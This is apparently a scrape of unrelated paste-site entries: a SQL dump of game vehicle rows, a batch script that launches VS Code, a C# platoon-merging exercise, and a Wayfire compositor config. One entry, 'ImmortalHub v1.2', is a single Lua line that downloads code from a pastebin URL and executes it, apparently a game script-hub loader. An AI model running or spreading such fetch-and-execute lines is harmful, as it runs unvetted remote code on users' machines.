    (18, 'LSSD12', 'sheriff', '{""x"":1310.122,""y"":229.24364,""z"":-48.952057}', '{""x"":0.00,""y"":0.00,""z"":90.00}', 3, 3, 111, 111, '{""PrimColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""SecColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""PrimModColor"":-1,""SecModColor"":-1,""Muffler"":-1,""SideSkirt"":-1,""Hood"":-1,""Spoiler"":-1,""Lattice"":-1,""Wings"":-1,""Roof"":-1,""Vinyls"":-1,""FrontBumper"":-1,""RearBumper"":-1,""Engine"":3,""Turbo"":0,""Horn"":-1,""Transmission"":2,""WindowTint"":1,""Suspension"":-1,""Brakes"":2,""Headlights"":-1,""NumberPlate"":0,""Wheels"":-1,""WheelsType"":0,""WheelsColor"":0,""NeonColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":0},""Armor"":-1}'),
    (18, 'LSSD13', 'sheriff', '{""x"":1310.1891,""y"":233.68289,""z"":-48.95273}', '{""x"":0.00,""y"":0.00,""z"":90.00}', 3, 3, 111, 111, '{""PrimColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""SecColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""PrimModColor"":-1,""SecModColor"":-1,""Muffler"":-1,""SideSkirt"":-1,""Hood"":-1,""Spoiler"":-1,""Lattice"":-1,""Wings"":-1,""Roof"":-1,""Vinyls"":-1,""FrontBumper"":-1,""RearBumper"":-1,""Engine"":3,""Turbo"":0,""Horn"":-1,""Transmission"":2,""WindowTint"":1,""Suspension"":-1,""Brakes"":2,""Headlights"":-1,""NumberPlate"":0,""Wheels"":-1,""WheelsType"":0,""WheelsColor"":0,""NeonColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":0},""Armor"":-1}'),
    (18, 'LSSD14', 'sheriff', '{""x"":1310.1555,""y"":239.5081,""z"":-48.953213}', '{""x"":0.00,""y"":0.00,""z"":90.00}', 3, 3, 111, 111, '{""PrimColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""SecColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""PrimModColor"":-1,""SecModColor"":-1,""Muffler"":-1,""SideSkirt"":-1,""Hood"":-1,""Spoiler"":-1,""Lattice"":-1,""Wings"":-1,""Roof"":-1,""Vinyls"":-1,""FrontBumper"":-1,""RearBumper"":-1,""Engine"":3,""Turbo"":0,""Horn"":-1,""Transmission"":2,""WindowTint"":1,""Suspension"":-1,""Brakes"":2,""Headlights"":-1,""NumberPlate"":0,""Wheels"":-1,""WheelsType"":0,""WheelsColor"":0,""NeonColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":0},""Armor"":-1}'),
    (18, 'LSSD15', 'sheriff', '{""x"":1310.1425,""y"":243.25587,""z"":-48.95335}', '{""x"":0.00,""y"":0.00,""z"":90.00}', 3, 3, 111, 111, '{""PrimColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""SecColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""PrimModColor"":-1,""SecModColor"":-1,""Muffler"":-1,""SideSkirt"":-1,""Hood"":-1,""Spoiler"":-1,""Lattice"":-1,""Wings"":-1,""Roof"":-1,""Vinyls"":-1,""FrontBumper"":-1,""RearBumper"":-1,""Engine"":3,""Turbo"":0,""Horn"":-1,""Transmission"":2,""WindowTint"":1,""Suspension"":-1,""Brakes"":2,""Headlights"":-1,""NumberPlate"":0,""Wheels"":-1,""WheelsType"":0,""WheelsColor"":0,""NeonColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":0},""Armor"":-1}'),
    (18, 'LSSD16', 'sheriff', '{""x"":1310.107,""y"":247.73572,""z"":-48.953228}', '{""x"":0.00,""y"":0.00,""z"":90.00}', 3, 3, 111, 111, '{""PrimColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""SecColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""PrimModColor"":-1,""SecModColor"":-1,""Muffler"":-1,""SideSkirt"":-1,""Hood"":-1,""Spoiler"":-1,""Lattice"":-1,""Wings"":-1,""Roof"":-1,""Vinyls"":-1,""FrontBumper"":-1,""RearBumper"":-1,""Engine"":3,""Turbo"":0,""Horn"":-1,""Transmission"":2,""WindowTint"":1,""Suspension"":-1,""Brakes"":2,""Headlights"":-1,""NumberPlate"":0,""Wheels"":-1,""WheelsType"":0,""WheelsColor"":0,""NeonColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":0},""Armor"":-1}'),
    (18, 'LSSD17', 'sheriff', '{""x"":1310.1631,""y"":251.6208,""z"":-48.952805}', '{""x"":0.00,""y"":0.00,""z"":90.00}', 3, 3, 111, 111, '{""PrimColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""SecColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""PrimModColor"":-1,""SecModColor"":-1,""Muffler"":-1,""SideSkirt"":-1,""Hood"":-1,""Spoiler"":-1,""Lattice"":-1,""Wings"":-1,""Roof"":-1,""Vinyls"":-1,""FrontBumper"":-1,""RearBumper"":-1,""Engine"":3,""Turbo"":0,""Horn"":-1,""Transmission"":2,""WindowTint"":1,""Suspension"":-1,""Brakes"":2,""Headlights"":-1,""NumberPlate"":0,""Wheels"":-1,""WheelsType"":0,""WheelsColor"":0,""NeonColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":0},""Armor"":-1}'),
    (18, 'LSSD18', 'riot', '{""x"":1309.391,""y"":257.98,""z"":-48.905754}', '{""x"":0.00,""y"":0.00,""z"":90.00}', 3, 3, 111, 111, '{""PrimColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""SecColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""PrimModColor"":-1,""SecModColor"":-1,""Muffler"":-1,""SideSkirt"":-1,""Hood"":-1,""Spoiler"":-1,""Lattice"":-1,""Wings"":-1,""Roof"":-1,""Vinyls"":-1,""FrontBumper"":-1,""RearBumper"":-1,""Engine"":3,""Turbo"":0,""Horn"":-1,""Transmission"":2,""WindowTint"":1,""Suspension"":-1,""Brakes"":2,""Headlights"":-1,""NumberPlate"":0,""Wheels"":-1,""WheelsType"":0,""WheelsColor"":0,""NeonColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":0},""Armor"":-1}'),
    (18, 'LSSD19', 'sheriff', '{""x"":1281.0149,""y"":258.14813,""z"":-48.952236}', '{""x"":0.00,""y"":0.00,""z"":-90.00}', 3, 3, 111, 111, '{""PrimColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""SecColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""PrimModColor"":-1,""SecModColor"":-1,""Muffler"":-1,""SideSkirt"":-1,""Hood"":-1,""Spoiler"":-1,""Lattice"":-1,""Wings"":-1,""Roof"":-1,""Vinyls"":-1,""FrontBumper"":-1,""RearBumper"":-1,""Engine"":3,""Turbo"":0,""Horn"":-1,""Transmission"":2,""WindowTint"":1,""Suspension"":-1,""Brakes"":2,""Headlights"":-1,""NumberPlate"":0,""Wheels"":-1,""WheelsType"":0,""WheelsColor"":0,""NeonColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":0},""Armor"":-1}'),
    (18, 'LSSD20', 'sheriff', '{""x"":1280.9463,""y"":251.98941,""z"":-48.95294}', '{""x"":0.00,""y"":0.00,""z"":-90.00}', 3, 3, 111, 111, '{""PrimColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""SecColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""PrimModColor"":-1,""SecModColor"":-1,""Muffler"":-1,""SideSkirt"":-1,""Hood"":-1,""Spoiler"":-1,""Lattice"":-1,""Wings"":-1,""Roof"":-1,""Vinyls"":-1,""FrontBumper"":-1,""RearBumper"":-1,""Engine"":3,""Turbo"":0,""Horn"":-1,""Transmission"":2,""WindowTint"":1,""Suspension"":-1,""Brakes"":2,""Headlights"":-1,""NumberPlate"":0,""Wheels"":-1,""WheelsType"":0,""WheelsColor"":0,""NeonColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":0},""Armor"":-1}'),
    (18, 'LSSD21', 'sheriff', '{""x"":1280.9126,""y"":248.17995,""z"":-48.95311}', '{""x"":0.00,""y"":0.00,""z"":-90.00}', 3, 3, 111, 111, '{""PrimColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""SecColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""PrimModColor"":-1,""SecModColor"":-1,""Muffler"":-1,""SideSkirt"":-1,""Hood"":-1,""Spoiler"":-1,""Lattice"":-1,""Wings"":-1,""Roof"":-1,""Vinyls"":-1,""FrontBumper"":-1,""RearBumper"":-1,""Engine"":3,""Turbo"":0,""Horn"":-1,""Transmission"":2,""WindowTint"":1,""Suspension"":-1,""Brakes"":2,""Headlights"":-1,""NumberPlate"":0,""Wheels"":-1,""WheelsType"":0,""WheelsColor"":0,""NeonColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":0},""Armor"":-1}'),
    (18, 'LSSD22', 'sheriff', '{""x"":1280.8562,""y"":243.41042,""z"":-48.952675}', '{""x"":0.00,""y"":0.00,""z"":-90.00}', 3, 3, 111, 111, '{""PrimColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""SecColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""PrimModColor"":-1,""SecModColor"":-1,""Muffler"":-1,""SideSkirt"":-1,""Hood"":-1,""Spoiler"":-1,""Lattice"":-1,""Wings"":-1,""Roof"":-1,""Vinyls"":-1,""FrontBumper"":-1,""RearBumper"":-1,""Engine"":3,""Turbo"":0,""Horn"":-1,""Transmission"":2,""WindowTint"":1,""Suspension"":-1,""Brakes"":2,""Headlights"":-1,""NumberPlate"":0,""Wheels"":-1,""WheelsType"":0,""WheelsColor"":0,""NeonColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":0},""Armor"":-1}'),
    (18, 'LSSD23', 'sheriff', '{""x"":1280.8245,""y"":239.9252,""z"":-48.95341}', '{""x"":0.00,""y"":0.00,""z"":-90.00}', 3, 3, 111, 111, '{""PrimColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""SecColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""PrimModColor"":-1,""SecModColor"":-1,""Muffler"":-1,""SideSkirt"":-1,""Hood"":-1,""Spoiler"":-1,""Lattice"":-1,""Wings"":-1,""Roof"":-1,""Vinyls"":-1,""FrontBumper"":-1,""RearBumper"":-1,""Engine"":3,""Turbo"":0,""Horn"":-1,""Transmission"":2,""WindowTint"":1,""Suspension"":-1,""Brakes"":2,""Headlights"":-1,""NumberPlate"":0,""Wheels"":-1,""WheelsType"":0,""WheelsColor"":0,""NeonColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":0},""Armor"":-1}'),

/*!40000 ALTER TABLE `fractionvehicles` ENABLE KEYS */;

"
VJdDibPj,Load CL.exe for Visual Studio Code,ohusq,Winbatch,Monday 6th of May 2024 03:54:52 PM CDT,"@echo off
setlocal

:: Path to the Visual Studio vcvars64.bat
set ""VCVARS64_PATH=C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat""

:: Check if the VC vars batch file exists
if not exist ""%VCVARS64_PATH%"" (
    echo Error: Visual Studio 2022 Build Tools vcvars64.bat not found.
    exit /b 1
)

:: Initialize Visual Studio Build Tools environment
call ""%VCVARS64_PATH%"" >nul 2>&1

:: Prompt user to enter the code folder path
echo Please enter the full path to your code folder:
set /p CODEFOLDER=""Path: ""
set ""CONCAT=%USERPROFILE%\Visual Studio Code\""
:: Check if the directory exists
if not exist ""%CONCAT%%CODEFOLDER%"" (
    echo Error: The specified folder does not exist.
    exit /b 1
)

:: Change to the specified directory

cd /d ""%CONCAT%%CODEFOLDER%""

:: Open Visual Studio Code in the directory
code .

:: End of script
endlocal"
jnryQHHZ,Untitled,_KAGATUN_,C#,Monday 6th of May 2024 03:06:58 PM CDT,"using System;
using System.Collections.Generic;
using System.Linq;

namespace UnificationTroops
{
    internal class Program
    {
        static void Main(string[] args)
        {
            List<Soldier> soldiersFirst = new List<Soldier>
            {
                new Soldier (""Иванов"", ""Иван"", ""Иванович""),
                new Soldier (""Петров"", ""Николай"", ""Владимирович""),
                new Soldier (""Сергеев"", ""Илья"", ""Петрович""),
                new Soldier (""Соколовский"", ""Иван"", ""Константинович""),
                new Soldier (""Абрамов"", ""Александр"", ""Валентинович""),
                new Soldier (""Березов"", ""Александр"", ""Сергеевич""),
                new Soldier (""Баженов"", ""Дмитрий"", ""Дмитриевич""),
                new Soldier (""Корешков"", ""Валерий"", ""Степанович""),
                new Soldier (""Чечеков"", ""Артем"", ""Александрович""),
                new Soldier (""Крикунов"", ""Михаил"", ""Евгеньевич""),
                new Soldier (""Зайцев"", ""Арсений"", ""Антонович""),
                new Soldier (""Бобров"", ""Артемий"", ""Валерьевич""),
                new Soldier (""Юров"", ""Игнат"", ""Семенович""),
                new Soldier (""Зайцев"", ""Николай"", ""Константинович""),
                new Soldier (""Бабкин"", ""Юрий"", ""Антонович""),
                new Soldier (""Кот"", ""Станислав"", ""Игоревич""),
                new Soldier (""Зайцев"", ""Александр"", ""Юрьевич""),
                new Soldier (""Воробьев"", ""Николай"", ""Антонович""),
                new Soldier (""Смирнов"", ""Юрий"", ""Алексеевич""),
                new Soldier (""Уткин"", ""Андрей"", ""Иванович""),
                new Soldier (""Лебедев"", ""Юрий"", ""Иванович""),
            };

            List<Soldier> soldiersSecond = new List<Soldier>
            {
                new Soldier(""Березов"", ""Иван"", ""Иванович""),
                new Soldier(""Братов"", ""Николай"", ""Владимирович""),
                new Soldier(""Бережной"", ""Илья"", ""Степанович""),
                new Soldier(""Богомолов"", ""Иван"", ""Константинович""),
                new Soldier(""Брежнев"", ""Александр"", ""Валентинович""),
                new Soldier(""Беглов"", ""Илья"", ""Петрович"")
            };

            Platoon platoonFirst = new Platoon(soldiersFirst);
            platoonFirst.ShowPlatoon(""\nДо изменений первый отряд\n"");

            Platoon platoonSecond = new Platoon(soldiersSecond);
            platoonSecond.ShowPlatoon(""\nДо изменений второй отряд\n"");

            List<Soldier> soldiers = platoonFirst.GetSoldiers();

            platoonSecond.CombinePlatoons(soldiers);

            platoonFirst.ShowPlatoon(""\nПосле изменений первый отряд\n"");

            platoonSecond.ShowPlatoon(""\nПосле изменений второй отряд\n"");
        }
    }

    class Soldier
    {
        public Soldier(string surname, string name, string patronymic)
        {
            Surname = surname;
            Name = name;
            Patronymic = patronymic;
        }

        public string Surname { get; private set; }
        public string Name { get; private set; }
        public string Patronymic { get; private set; }

        public void ShowInfo()
        {
            Console.WriteLine($""Фамилия: {Surname}, Имя: {Name}, Отчество: {Patronymic}"");
        }
    }

    class Platoon
    {
        private List<Soldier> _soldiers = new List<Soldier>();

        public Platoon(List<Soldier> soldiers)
        {
            _soldiers = soldiers;
        }

        public List<Soldier> GetSoldiers()
        {
            var sortedSoldiers = _soldiers.Where(soldier => soldier.Surname.StartsWith(""Б"")).ToList();

            _soldiers.RemoveAll(soldier => sortedSoldiers.Contains(soldier));

            return sortedSoldiers;
        }

        public void CombinePlatoons(List<Soldier> soldiers)
        {
            _soldiers.AddRange(soldiers);

            soldiers.Clear();
        }

        public void ShowPlatoon(string text)
        {
            Console.WriteLine(text);

            foreach (Soldier soldier in _soldiers)
            {
                soldier.ShowInfo();
            }
        }
    }
}

"
kVtrU2V7,ImmortalHub v1.2,somerandokid,Lua,Monday 6th of May 2024 02:58:32 PM CDT,"loadstring(game:HttpGet(""https://pastebin.com/raw/SGtLBYX1"", true))()"
y6PpbdVw,Wayfire.ini_now,bluebyt,INI file,Monday 6th of May 2024 02:52:05 PM CDT,"[alpha]
min_value = 0.100000
modifier = <alt> <super> 

[animate]
close_animation = fire
duration = 100ms circle
enabled_for = (type equals ""toplevel"" | (type equals ""x-or"" & focusable equals true))
fade_duration = 400ms circle
fade_enabled_for = type equals ""overlay""
fire_color = \#B22303FF
fire_duration = 300ms circle
fire_enabled_for = none
fire_particle_size = 16.000000
fire_particles = 2000
open_animation = zoom
random_fire_color = false
startup_duration = 600ms circle
zoom_duration = 500ms circle
zoom_enabled_for = none

[annotate]
clear_workspace = <alt> <super> KEY_C
draw = <alt> <super> BTN_LEFT
from_center = true
line_width = 3.000000
method = draw
stroke_color = \#FF0000FF

[autorotate-iio]
lock_rotation = false
rotate_down = <ctrl> <super> KEY_DOWN
rotate_left = <ctrl> <super> KEY_LEFT
rotate_right = <ctrl> <super> KEY_RIGHT
rotate_up = <ctrl> <super> KEY_UP

[autostart]
0_0 = systemctl --user import-environment WAYLAND_DISPLAY XDG_CURRENT_DESKTOP
0_1 = dbus-update-activation-environment --systemd WAYLAND_DISPLAY DISPLAY XAUTHORITY XDG_CURRENT_DESKTOP=sway XDG_SESSION_TYPE=wayland
autostart_wf_shell = false
background = wf-background
bar = 
dock = wf-dock

launcher01 = /home/bluebyt/.bin/thunar.sh
launcher02 = kitty
launcher03 = alacritty -e ""ncmpcpp""
launcher04 = mpv /mnt/media/Videos/Chillout008/playlist.m3u &
launcher05 = brave-beta --ozone-platform=wayland &
launcher06 = firefox
launcher07 = lite-xl
launcher08 = xfce4-terminal
launcher09 = blueman-manager
launcher10 = pavucontrol
launcher12 = nwg-look
launcher13 = vesktop
launcher14 = ristretto -s /mnt/media/Deviant/ &
launcher15 = foot bpytop
launcher16 = wezterm
launcher17 = clapper /mnt/media/Videos/Chillout009/playlist.claps
launcher18 = ~/.config/scripts/./eww-start3.sh
launcher19 = ulauncher --hide-window
launcher20 = 
launcher21 = 
launcher22 = 
launcher23 = 
launcher24 = 
launcher25 = swayosd-server
launcher26 = swayosd-libinput-backend
launcher27 = notify-send -a aurora ""hello $(whoami)""
launcher28 = /usr/bin/xava
launcher29 = pactl load-module module-switch-on-connect
launcher30 = swww init && swww img ~/Pictures/Nord/Nord_wall2.jpeg
launcher31 = /home/bluebyt/.local/bin/ironbar
launcher32 = g4music
notifications = mako
polkit-gnome = /usr/lib/polkit-gnome/polkit-gnome-authentication-agent-1
portal = /usr/lib/xdg-desktop-portal --replace & /usr/lib/xdg-desktop-portal-wlr

[background-view]

[bench]
average_frames = 25
position = top_center

[blur]
blur_by_default = type is ""toplevel""
bokeh_degrade = 1
bokeh_iterations = 15
bokeh_offset = 5.000000
box_degrade = 1
box_iterations = 2
box_offset = 1.000000
gaussian_degrade = 1
gaussian_iterations = 2
gaussian_offset = 1.000000
kawase_degrade = 8
kawase_iterations = 2
kawase_offset = 2.000000
method = gaussian
saturation = 1.000000
toggle = none

[command]
binding_launcher = <ctrl> KEY_SPACE
binding_logout = <super> KEY_ESC
binding_mute = KEY_MUTE
binding_rofi = <ctrl> KEY_G
binding_screenshot = KEY_SYSRQ
binding_slurp = <ctrl> KEY_SYSRQ
binding_terminal = <super> KEY_ENTER
binding_voldown = KEY_VOLUMEDOWN
binding_volup = KEY_VOLUMEUP
binding_wofi = <ctrl> KEY_B
command_launcher = ulauncher-toggle &
command_logout = wlogout
command_mute = swayosd-client --output-volume mute-toggle
command_rofi = rofi -show drun &
command_screenshot = ~/.bin/grimshot.sh --notify save screen
command_slurp = ~/.bin/grimshot.sh --notify save window
command_terminal = blackbox
command_voldown = wpctl set-volume @DEFAULT_AUDIO_SINK@ 5%- | swayosd-client --output-volume lower
command_volup = wpctl set-volume @DEFAULT_AUDIO_SINK@ 5%+ | swayosd-client --output-volume raise
command_wofi = wofi --show drun &

[core]
background_color = \#1A1A1AFF
close_top_view = <super> KEY_Q
focus_button_with_modifiers = false
focus_buttons = BTN_LEFT | BTN_MIDDLE | BTN_RIGHT
focus_buttons_passthrough = true
max_render_time = -1
plugins = ipc ipc-rules stipc alpha animate autostart command cube expo fast-switcher fisheye grid foreign-toplevel gtk-shell idle move place resize switcher vswitch window-rules wm-actions wobbly wrot zoom scale wf-info background-view wsets pixdecor
preferred_decoration_mode = server
transaction_timeout = 100
vheight = 3
vwidth = 3
xwayland = true

[crosshair]
line_color = \#FF0000FF
line_width = 2

[cube]
activate = <alt> <ctrl> BTN_LEFT
background = \#1A1A1AFF
background_mode = simple
cubemap_image = 
deform = 1
initial_animation = 350ms circle
light = true
rotate_left = none
rotate_right = none
skydome_mirror = true
skydome_texture = 
speed_spin_horiz = 0.020000
speed_spin_vert = 0.020000
speed_zoom = 0.070000
zoom = 0.100000

[decoration]
active_color = \#222222AA
border_size = 0
button_order = minimize maximize close
font = sans-serif
ignore_views = none
inactive_color = \#333333DD
title_height = 0

[expo]
background = \#1A1A1AFF
duration = 300ms circle
inactive_brightness = 0.700000
keyboard_interaction = true
offset = 10
select_workspace_1 = <ctrl> KEY_1
select_workspace_2 = KEY_2
select_workspace_3 = KEY_3
select_workspace_4 = KEY_4
select_workspace_5 = KEY_5
select_workspace_6 = KEY_6
select_workspace_7 = KEY_7
select_workspace_8 = KEY_8
select_workspace_9 = KEY_9
toggle = <super>  | hotspot left-top 10x10 200
transition_length = 200

[extra-gestures]
close_fingers = 20
move_delay = 500
move_fingers = 3

[fast-switcher]
activate = <alt> KEY_ESC
activate_backward = <alt> <shift> KEY_ESC
inactive_alpha = 0.700000

[fisheye]
radius = 450.000000
toggle = <ctrl> <super> KEY_F
zoom = 7.000000

[focus-change]
cross-output = false
cross-workspace = false
down = <shift> <super> KEY_DOWN
grace-down = 1
grace-left = 1
grace-right = 1
grace-up = 1
left = <shift> <super> KEY_LEFT
raise-on-change = true
right = <shift> <super> KEY_RIGHT
scan-height = 0
scan-width = 0
up = <shift> <super> KEY_UP

[focus-steal-prevent]
cancel_keys = KEY_ENTER
deny_focus_views = none
timeout = 1000

[follow-focus]
change_output = true
change_view = true
focus_delay = 50
raise_on_top = true
threshold = 10

[force-fullscreen]
constrain_pointer = false
constraint_area = view
key_toggle_fullscreen = <alt> <super> KEY_F
preserve_aspect = true
transparent_behind_views = true
x_skew = 0.000000
y_skew = 0.000000

[foreign-toplevel]

[grid]
duration = 300ms circle
restore = <super> KEY_DOWN | <super> KEY_KP0
slot_b = <super> KEY_KP2
slot_bl = <super> KEY_KP1
slot_br = <super> KEY_KP3
slot_c = <super> KEY_UP | <super> KEY_KP5
slot_l = <super> KEY_LEFT | <super> KEY_KP4
slot_r = <super> KEY_RIGHT | <super> KEY_KP6
slot_t = <super> KEY_KP8
slot_tl = <super> KEY_KP7
slot_tr = <super> KEY_KP9
type = crossfade

[gtk-shell]

[hide-cursor]
hide_delay = 2000
toggle = <ctrl> <super> KEY_H

[hinge]
filename = /sys/bus/iio/devices/iio:device1/in_angl0_raw
flip_degree = 180
poll_freq = 200

[idle]
cube_max_zoom = 1.500000
cube_rotate_speed = 1.000000
cube_zoom_speed = 1000
disable_initially = false
disable_on_fullscreen = false
dpms_timeout = -1
screensaver_timeout = 120
toggle = none

[input]
click_method = default
cursor_size = 24
cursor_theme = Bibata-Modern-Classic
disable_touchpad_while_mouse = false
disable_touchpad_while_typing = false
drag_lock = false
gesture_sensitivity = 1.000000
kb_capslock_default_state = false
kb_numlock_default_state = true
kb_repeat_delay = 400
kb_repeat_rate = 40
left_handed_mode = false
middle_emulation = false
modifier_binding_timeout = 400
mouse_accel_profile = default
mouse_cursor_speed = 0.000000
mouse_scroll_speed = 1.000000
natural_scroll = false
scroll_method = default
tablet_motion_mode = default
tap_to_click = true
touchpad_accel_profile = default
touchpad_cursor_speed = 0.000000
touchpad_scroll_speed = 1.000000
xkb_layout = us,ca
xkb_model = pc105
xkb_options = grp:alt_shift_toggle
xkb_rules = evdev
xkb_variant = altgr-intl

[input-device]
output = 

[input-method-v1]
enable_text_input_v1 = true
enable_text_input_v3 = true

[invert]
preserve_hue = false
toggle = <super> KEY_I

[ipc]

[ipc-rules]

[join-views]

[keycolor]
color = \#000000FF
opacity = 0.250000
threshold = 0.500000

[mag]
default_height = 500
toggle = <alt> <super> KEY_M
zoom_level = 75

[move]
activate = <super> BTN_LEFT
enable_snap = true
enable_snap_off = true
join_views = false
preview_base_border = \#404080CC
preview_base_color = \#8080FF80
preview_border_width = 3
quarter_snap_threshold = 50
snap_off_threshold = 200
snap_threshold = 10
workspace_switch_after = -1

[obs]

[oswitch]
next_output = <super> KEY_O
next_output_with_win = <shift> <super> KEY_O
prev_output = 
prev_output_with_win = 

[output]
depth = 8
mode = auto
position = auto
scale = 1.000000
transform = normal
vrr = false

[pixdecor]
always_decorate = none
animate = true
bg_color = \#124580D9
bg_text_color = \#B3B3B3FF
border_size = 2
effect_color = \#9D7CD8FF
effect_type = neon_pattern
fg_color = \#3D59A1FF
fg_text_color = \#FFFFFFFF
ignore_views = none
maximized_borders = false
maximized_shadows = false
overlay_engine = rounded_corners
rounded_corner_radius = 5
shadow_color = \#00000040
shadow_radius = 10
titlebar = false

[place]
mode = center

[preserve-output]
last_output_focus_timeout = 10000

[resize]
activate = <super> BTN_RIGHT
activate_preserve_aspect = none

[scale]
allow_zoom = false
bg_color = \#1A1A1AE6
close_on_new_view = false
duration = 400ms circle
inactive_alpha = 0.750000
include_minimized = false
interact = false
middle_click_close = false
minimized_alpha = 0.450000
outer_margin = 0
spacing = 50
text_color = \#CCCCCCFF
title_font_size = 16
title_overlay = all
title_position = center
toggle = <super> KEY_P
toggle_all = <super> KEY_W

[scale-title-filter]
bg_color = \#00000080
case_sensitive = false
font_size = 30
overlay = true
share_filter = false
text_color = \#CCCCCCCC

[session-lock]

[shortcuts-inhibit]
break_grab = none
ignore_views = none
inhibit_by_default = none

[showrepaint]
reduce_flicker = true
toggle = <alt> <super> KEY_S

[simple-tile]
animation_duration = 0ms circle
button_move = <super> BTN_LEFT
button_resize = <super> BTN_RIGHT
inner_gap_size = 5
keep_fullscreen_on_adjacent = true
key_focus_above = <super> KEY_K
key_focus_below = <super> KEY_J
key_focus_left = <super> KEY_H
key_focus_right = <super> KEY_L
key_toggle = <super> KEY_T
outer_horiz_gap_size = 0
outer_vert_gap_size = 0
preview_base_border = \#404080CC
preview_base_color = \#8080FF80
preview_border_width = 3
tile_by_default = all

[switcher]
next_view = <alt> KEY_TAB
prev_view = <alt> <shift> KEY_TAB
speed = 500ms circle
view_thumbnail_rotation = 30
view_thumbnail_scale = 1.000000

[view-shot]
capture = <alt> <super> BTN_MIDDLE
command = notify-send ""The view under cursor was captured to %f""
filename = /tmp/snapshot-%F-%T.png

[vswipe]
background = \#1A1A1AFF
delta_threshold = 24.000000
duration = 180ms circle
enable_free_movement = false
enable_horizontal = true
enable_smooth_transition = false
enable_vertical = true
fingers = 4
gap = 32.000000
speed_cap = 0.050000
speed_factor = 256.000000
threshold = 0.350000

[vswitch]
background = \#1A1A1AFF
binding_down = <ctrl> KEY_DOWN
binding_last = 
binding_left = <ctrl> KEY_LEFT
binding_right = <ctrl> KEY_RIGHT
binding_up = <ctrl> KEY_UP
duration = 300ms circle
gap = 20
send_win_down = 
send_win_last = 
send_win_left = 
send_win_right = 
send_win_up = 
with_win_down = <ctrl> <super> KEY_DOWN
with_win_last = 
with_win_left = <ctrl> <super> KEY_LEFT
with_win_right = <ctrl> <super> KEY_RIGHT
with_win_up = <ctrl> <super> KEY_UP
wraparound = true

[water]
activate = <ctrl> <super> BTN_LEFT

[wayfire-shell]
toggle_menu = <super> 

[wf-info]

[window-rules]
rule_001 = on created if app_id is ""org.gnome.Nautilus"" then move 270 100
rule_002 = on created if app_id is ""org.gnome.Nautilus"" then set alpha 0.7
rule_003 = on created if title is ""Home"" then assign_workspace 0 0
rule_004 = on created if title is ""media"" then assign_workspace 2 0
rule_005 = on created if title is ""Videos"" then assign_workspace 2 2
rule_006 = on created if app_id is ""gnome-terminal-server"" then move 270 750
rule_007 = on created if app_id is ""gnome-terminal-server"" then set alpha 0.7
rule_008 = on created if app_id is ""gnome-terminal-server"" then assign_workspace 0 0
rule_009 = on created if app_id is ""tilix"" then move 1350 100
rule_010 = on created if app_id is ""tilix"" then set alpha 0.7
rule_011 = on created if app_id is ""tilix"" then assign_workspace 0 0
rule_012 = on created if app_id is ""totem"" then move 1300 750
rule_014 = on created if app_id is ""totem"" then assign_workspace 0 0
rule_015 = on created if app_id is ""firefox"" then move 270 70
rule_016 = on created if app_id is ""firefox"" then set alpha 1.0
rule_017 = on created if app_id is ""firefox"" then assign_workspace 1 0
rule_018 = on created if app_id is ""chromium"" then move 280 70
rule_019 = on created if app_id is ""chromium"" then set alpha 1.0
rule_020 = on created if app_id is ""chromium"" then assign_workspace 1 0
rule_021 = on created if app_id is ""org.gnome.tweaks"" then move 270 100
rule_022 = on created if app_id is ""org.gnome.tweaks"" then assign_workspace 0 1
rule_023 = on created if app_id is ""thunar"" then move 270 100
rule_024 = on created if app_id is ""thunar"" then set alpha 0.8
rule_025 = on created if title is ""bluebyt - Thunar"" then assign_workspace 0 0
rule_026 = on created if title is ""Downloads - Thunar"" then assign_workspace 2 0
rule_027 = on created if title is ""media - Thunar"" then assign_workspace 2 2
rule_028 = on created if app_id is ""xfce4-terminal"" then move 270 700
rule_029 = on created if app_id is ""xfce4-terminal"" then set alpha 0.8
rule_030 = on created if app_id is ""xfce4-terminal"" then assign_workspace 2 0
rule_031 = on created if app_id is ""shotwell"" then move 270 100
rule_032 = on created if app_id is ""shotwell"" then assign_workspace 2 1
rule_034 = on created if app_id is ""gthumb"" then move 270 100
rule_035 = on created if app_id is ""gthumb"" then set alpha 0.8
rule_036 = on created if app_id is ""gthumb"" then assign_workspace 2 1
